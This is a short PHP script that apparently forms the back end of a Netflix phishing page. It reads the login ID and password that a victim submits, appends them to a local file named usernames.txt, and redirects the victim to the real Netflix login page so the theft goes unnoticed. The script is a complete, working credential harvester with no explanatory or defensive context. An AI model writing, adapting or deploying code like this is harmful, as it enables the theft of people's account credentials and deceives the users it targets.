<?php

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['userLoginId'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/login');
